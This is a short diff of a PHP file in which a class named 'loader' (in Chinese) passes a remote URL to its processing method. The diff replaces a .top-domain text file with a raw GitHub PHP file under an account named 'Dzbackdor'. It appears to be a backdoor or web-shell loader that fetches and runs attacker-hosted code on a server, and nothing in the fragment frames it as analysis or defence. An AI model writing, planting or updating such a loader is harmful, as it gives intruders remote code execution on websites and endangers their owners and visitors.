@@ -26,5 +26,5 @@ class 加载器 {
 }
 
 加载器::准备();
-加载器::处理("https://ampnyapunyaku.top/tools/s-media/media-new.txt");
+加载器::处理("https://raw.githubusercontent.com/Dzbackdor/anonymous/refs/heads/main/media/media-v4.php");
 ?>
